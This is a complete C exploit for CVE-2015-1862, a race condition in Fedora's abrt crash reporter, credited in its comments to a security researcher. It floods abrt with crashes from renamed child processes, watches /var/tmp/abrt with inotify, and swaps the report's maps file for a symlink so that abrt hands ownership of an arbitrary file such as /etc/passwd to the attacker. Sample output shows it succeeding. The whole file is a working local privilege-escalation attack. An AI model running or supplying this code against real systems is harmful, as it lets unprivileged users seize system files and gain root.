#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <stdio.h>
#include <signal.h>
#include <err.h>
#include <string.h>
#include <alloca.h>
#include <limits.h>
#include <sys/inotify.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>

//
// This is a race condition exploit for CVE-2015-1862, targeting Fedora.
//
// Note: It can take a few minutes to win the race condition.
//
//   -- taviso@cmpxchg8b.com, April 2015.
//
// $ cat /etc/fedora-release 
// Fedora release 21 (Twenty One)
// $ ./a.out /etc/passwd
// [ wait a few minutes ]
// Detected ccpp-2015-04-13-21:54:43-14183.new, attempting to race...
//     Didn\'t win, trying again!
// Detected ccpp-2015-04-13-21:54:43-14186.new, attempting to race...
//     Didn\'t win, trying again!
// Detected ccpp-2015-04-13-21:54:43-14191.new, attempting to race...
//     Didn\'t win, trying again!
// Detected ccpp-2015-04-13-21:54:43-14195.new, attempting to race...
//     Didn\'t win, trying again!
// Detected ccpp-2015-04-13-21:54:43-14198.new, attempting to race...
//     Exploit successful...
// -rw-r--r--. 1 taviso abrt 1751 Sep 26  2014 /etc/passwd
//

static const char kAbrtPrefix[] = \"/var/tmp/abrt/\";
static const size_t kMaxEventBuf = 8192;
static const size_t kUnlinkAttempts = 8192 * 2;
static const int kCrashDelay = 10000;

static pid_t create_abrt_events(const char *name);

int main(int argc, char **argv)
{
    int fd, i;
    int watch;
    pid_t child;
    struct stat statbuf;
    struct inotify_event *ev;
    char *eventbuf = alloca(kMaxEventBuf);
    ssize_t size;

    // First argument is the filename user wants us to chown().
    if (argc != 2) {
        errx(EXIT_FAILURE, \"please specify filename to chown (e.g. /etc/passwd)\");
    }

    // This is required as we need to make different comm names to avoid
    // triggering abrt rate limiting, so we fork()/execve() different names.
    if (strcmp(argv[1], \"crash\") == 0) {
        __builtin_trap();
    }

    // Setup inotify, and add a watch on the abrt directory.
    if ((fd = inotify_init()) < 0) {
        err(EXIT_FAILURE, \"unable to initialize inotify\");
    }

    if ((watch = inotify_add_watch(fd, kAbrtPrefix, IN_CREATE)) < 0) {
        err(EXIT_FAILURE, \"failed to create new watch descriptor\");
    }

    // Start causing crashes so that abrt generates reports.
    if ((child = create_abrt_events(*argv)) == -1) {
        err(EXIT_FAILURE, \"failed to generate abrt reports\");
    }

    // Now start processing inotify events.
    while ((size = read(fd, eventbuf, kMaxEventBuf)) > 0) {

        // We can receive multiple events per read, so check each one.
        for (ev = eventbuf; ev < eventbuf + size; ev = &ev->name[ev->len]) {
            char dirname[NAME_MAX];
            char mapsname[NAME_MAX];
            char command[1024];

            // If this is a new ccpp report, we can start trying to race it.
            if (strncmp(ev->name, \"ccpp\", 4) != 0) {
                continue;
            }

            // Construct pathnames.
            strncpy(dirname, kAbrtPrefix, sizeof dirname);
            strncat(dirname, ev->name, sizeof dirname);

            strncpy(mapsname, dirname, sizeof dirname);
            strncat(mapsname, \"/maps\", sizeof mapsname);

            fprintf(stderr, \"Detected %s, attempting to race...\\n\", ev->name);

            // Check if we need to wait for the next event or not.
            while (access(dirname, F_OK) == 0) {
                for (i = 0; i < kUnlinkAttempts; i++) {
                    // We need to unlink() and symlink() the file to win.
                    if (unlink(mapsname) != 0) {
                        continue;
                    }

                    // We won the first race, now attempt to win the
                    // second race....
                    if (symlink(argv[1], mapsname) != 0) {
                        break;
                    }

                    // This looks good, but doesn\'t mean we won, it\'s possible
                    // chown() might have happened while the file was unlinked.
                    //
                    // Give it a few microseconds to run chown()...just in case
                    // we did win.
                    usleep(10);

                    if (stat(argv[1], &statbuf) != 0) {
                        errx(EXIT_FAILURE, \"unable to stat target file %s\", argv[1]);
                    }

                    if (statbuf.st_uid != getuid()) {
                        break;
                    }

                    fprintf(stderr, \"\\tExploit successful...\\n\");

                    // We\'re the new owner, run ls -l to show user.
                    sprintf(command, \"ls -l %s\", argv[1]);
                    system(command);

                    return EXIT_SUCCESS;
                }
            }

            fprintf(stderr, \"\\tDidn\'t win, trying again!\\n\");
        }
    }

    err(EXIT_FAILURE, \"failed to read inotify event\");
}

// This routine attempts to generate new abrt events. We can\'t just crash,
// because abrt sanely tries to rate limit report creation, so we need a new
// comm name for each crash.
static pid_t create_abrt_events(const char *name)
{
    char *newname;
    int status;
    pid_t child, pid;

    // Create a child process to generate events.
    if ((child = fork()) != 0)
        return child;

    // Make sure we stop when parent dies.
    prctl(PR_SET_PDEATHSIG, SIGKILL);

    while (true) {
        // Choose a new unused filename
        newname = tmpnam(0);

        // Make sure we\'re not too fast.
        usleep(kCrashDelay);

        // Create a new crashing subprocess.
        if ((pid = fork()) == 0) {
            if (link(name, newname) != 0) {
                err(EXIT_FAILURE, \"failed to create a new exename\");
            }

            // Execute crashing process.
            execl(newname, newname, \"crash\", NULL);

            // This should always work.
            err(EXIT_FAILURE, \"unexpected execve failure\");
        }

        // Reap crashed subprocess.
        if (waitpid(pid, &status, 0) != pid) {
            err(EXIT_FAILURE, \"waitpid failure\");
        }

        // Clean up the temporary name.
        if (unlink(newname) != 0) {
            err(EXIT_FAILURE, \"failed to clean up\");
        }

        // Make sure it crashed as expected.
        if (!WIFSIGNALED(status)) {
            errx(EXIT_FAILURE, \"something went wrong\");
        }
    }

    return child;
}